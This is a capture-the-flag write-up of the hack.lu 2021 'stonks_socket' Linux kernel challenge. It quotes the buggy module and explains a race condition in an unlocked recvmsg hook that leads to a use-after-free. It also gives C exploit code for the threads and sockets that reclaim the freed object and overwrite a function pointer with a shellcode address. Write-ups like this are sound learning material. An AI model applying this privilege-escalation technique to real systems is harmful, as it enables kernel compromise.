# stonks_socket - hack.lu 2021

## Overview and vuln
- Introduce a new implementation in socket: 

```c
int stonks_ioctl(struct sock *sk, int cmd, unsigned long arg) {
    int err;
    u64 *sks = (u64*)sk;
    union {
        struct {
            u64 off;
            u64 __user *data;
        };
        struct {
            unsigned size;
            u64 rounds;
            u64 key;
            u64 security;
        };
    } a;
    struct StonksSocket *stonks_sk;

    if (cmd == OPTION_CALL) {
        if (sk->sk_user_data != NULL) {
            return -EINVAL;
        }

        err = copy_from_user(&a, (void*)arg, sizeof(a));

        stonks_sk = kmalloc(sizeof(struct StonksSocket), GFP_KERNEL);
        stonks_sk->hash_size = a.size;
        stonks_sk->hash_rounds = a.rounds;
        stonks_sk->hash_key = a.key;
        if (a.security == 1) {
            stonks_sk->hash_function = secure_hash;
        } else {
            stonks_sk->hash_function = null_hash;
        }
        sk->sk_user_data = stonks_sk;
        sk->sk_prot->recvmsg = stonks_rocket;
        return err;
    } else if (cmd == OPTION_PUT) {
        if (sk->sk_user_data == NULL) {
            return -EINVAL;
        }
        kfree(sk->sk_user_data);
        sk->sk_user_data = NULL;
    } else if (cmd == OPTION_DEBUG) {
        err = copy_from_user(&a, (void*)arg, sizeof(a));
        return put_user(sks[a.off], a.data);
    }
    return tcp_ioctl(sk, cmd, arg);
}
```

- it overwrites `sk_user_data` with `stonks_sk` (`struct StonksSocket`) and `sk_prot->recvmsg` function with its own implement `stonks_rocket`:

```c
sk->sk_user_data = stonks_sk;
sk->sk_prot->recvmsg = stonks_rocket;
```

- `stonks_rocket`:

```c
int stonks_rocket(struct sock *sk, struct msghdr *msg, size_t len, int nonblock, int flags, int *addr_len) {
    int ret, count;
    struct StonksSocket *s_sk = sk->sk_user_data;
    struct Hash hash;
    struct iov_iter iter[2];

    ret = tcp_recvmsg(sk, msg, len, nonblock, flags, addr_len);
    if (ret < 1 || s_sk == NULL) {
        return ret;
    }
    printk(KERN_INFO "stonks_socket: received message, size: %d", ret);

    iter[0] = msg->msg_iter;
    iov_iter_init(&iter[1], WRITE, iter[0].iov, iter[0].count, ret);

    hash.length = s_sk->hash_size;
    hash.rounds = s_sk->hash_rounds;
    hash.key = s_sk->hash_key;
    count = s_sk->hash_function(&iter[1], &hash);

    len = copy_to_iter(&hash.word1, count, &iter[0]);
    ret += count;
    return ret;
}
```

- compare with source code from `net/ipv4/tcp.c`:
```c
int tcp_recvmsg(struct sock *sk,struct msghdr *msg,size_t len,int nonblock,   
		int flags,int*addr_len)  
{
    ...
	lock_sock(sk);
	ret = tcp_recvmsg_locked(sk, msg, len, nonblock, flags,&tss, 
				 &cmsg_flags);
	release_sock(sk);
    ...
}
EXPORT_SYMBOL(tcp_recvmsg);
```

=> no `lock_sock(sk)` => race condition bug

- It still has other bugs like oob read in `OPTION_DEBUG` and stack overflow in `secure_hash`

## Exploit path

- take a look in the `secure_hash` function called in `stonks_rocket`:
```c
int secure_hash(struct iov_iter *msg, struct Hash *h) {
    u64 i = 1, j, size;
    char *buf;
    char *hash = (char*)&h->word1;

    // init
    for (i = 0; i < h->length; i++) {
        (&h->word1)[i] = h->key;
    }

    //load data
    while (i) {
        size = h->length * sizeof(u64);
        buf = kmalloc(size, GFP_KERNEL);
        i = copy_from_iter(buf, size, msg);
        for (j = 0; j < i; j++) {
            hash[j] ^= buf[j];
        }
        kfree(buf);
    }

    // hash
    for (i = 0; i < h->rounds; i++) {
        for (j = 0; j < size; j++) {
            hash[j] = hash[(j+8)%size] ^ 0xAC ^ i;
        }
    }
    return size;
}
```

- In socket, `tcp_recvmsg` will wait until it receive buffer sent to socket by `send` or `write` function, since its not probably locked here, we can hang it by calling `recv` without `send` or `write` any buffer
- while the socket is hanged at function `tcp_recvmsg`, we can free `sk->sk_user_data`

```c
    } else if (cmd == OPTION_PUT) {
        if (sk->sk_user_data == NULL) {
            return -EINVAL;
        }
        kfree(sk->sk_user_data);
        sk->sk_user_data = NULL;
```

- in `secure_hash`, there is a loop to read data in from the buffer, its constantly kmalloc(size), copy data to it, xor and hash and free
- notice we can control the `size`, `size = h->length * sizeof(u64)` then if in our payload, `h->length` == 4 => size = 0x20
- `StonksSocket` struct size is 0x20 too:
```c
struct StonksSocket {
    unsigned hash_size;
    uint64_t hash_rounds;
    uint64_t hash_key;
    int (*hash_function)(struct iov_iter *msg, struct Hash *hash);
};
``` 

- in the loop above, it keeps **kmalloc** and write payload to it => after we free `sk_user_data`, because of FIFO, that chunk will be allocated in that loop by `kmalloc(0x20)` and we can write data to it => overwrite `hash_function` with our shellcode address since there are no **SMEP** or **SMAP**.
- after the socket finishes hanging at `tcp_recvmsg`, it call `hash_function` which is replaced by our shellcode address => win  

## Implement 

- prepare state: init `attacker_socket` and `victim_socket`, then send a huge payload to `attacker_socket` (its our payload contains shellcode ptr)

```c
attacker_socket = init_speaker(PORT);
attacker_socket_fd = accept(receiver_socket, &tmp_addr, &len_addr);
assert(attacker_socket_fd != -1);
assert(ioctl(attacker_socket_fd, OPTION_CALL, &user_req) == 0);
assert(send(attacker_socket, buffer, 0x80000, 0) != -1);

victim_socket = init_speaker(PORT);
victim_socket_fd = accept(receiver_socket, &tmp_addr, &len_addr);
assert(victim_socket_fd != -1);
assert(ioctl(victim_socket_fd, OPTION_CALL, &user_req) == 0);
```

- first, main thread will call `recv()` in `victim_socket`, but currently there is no buffer sent to `victim_socket` and because there is no lock in function `tcp_recvmsg()`
    => `victim_socket` hanged at `stonks_rocket()`
```c
recv(victim_socket_fd, recv_buffer, 0x100, 0);
```

- create 2 threads, thread 2 changes the `SIGNAL` to 1, wait a lil bit  

```c
void *thread2()
{
    puts("[+] This thread just wait and signal");
    usleep(1500000);
    // signal start thread1
    SIGNAL=1;

    usleep(3000);
    char tmp[8];
    puts("[+] victim_socket sending buffer");
    printf("%d\n", send(victim_socket, tmp, 8, 0));
}
```

- thread 1 wait until `SIGNAL` changed to 1, then immediately free `sk_user_data` of `victim_socket` and `recv()` the huge payload sent in the prepare state at `attacker_socket` => it will overwrite the `hash_function` with our shellcode address

```c
void *thread1()
{
    puts("[+] Free and overwrite thread");
    while (!SIGNAL);

    // Free sk_user_data in victim_socket_fd -> create a dangling pointer of sk_user_data
    ioctl(victim_socket_fd, OPTION_PUT, NULL);

    // Continously recv in attacker_socket_fs -> trigger secure_hash
    // -> the loop in secure_hash() constantly kmalloc and kfree a 0x20 chunks -> we alloc sk_user_data again and write our data to it 
    while (1) {
        recv(attacker_socket_fd, recv_buffer, 0x80000, 0);
    }

    return NULL;
}
```
- after a lil wait, thread 1 send any buffer to `victim_socket`, this release the `victim_socket` from hanging => `victim_socket` calls `sk->hash_function` which is overwrited to our shellcode

```bash
[    7.924387] stonks_socket: received message, size: 81274
[    7.927936] stonks_socket: received message, size: 8
[    7.928955] stonks_socket: received message, size: 49690
[    7.930662] stonks_socket: received message, size: 65482
[    7.932625] stonks_socket: received message, size: 261928
[    7.937731] stonks_socket: received message, size: 65482
```

- big size is our huge payload contains shellcode sent to `attacker_socket`
- 8 is the size of buffer sent to `victim_socket` to release the hang and call our shellcode

## Note
- In socket programming, `accept()` pulls a pending client connection from fdâ€™s queue and returns a new socket descriptor that can perform I/O with that client => careful with `fd`
- Socket is kinda like other modules, it has `ioctl`, `read`, `write` (`write` and `read` is equal to `send` and `recv` with flags == 0)
- race condition is mind blowing :o
- 1 step per loop may equal to usleep(100) ???? idk

## Conclusion
- Good challenge overall, nice to practice race condition w/o `userfaultfd`
- Yep, buggy configurations

## Ref:
- [mem2019's writeup](https://mem2019.github.io/jekyll/update/2021/10/31/HackLu2021-Stonks-Socket.html)
- [smallkirby's writeup](https://smallkirby.hatenablog.com/entry/2021/12/02/162758)

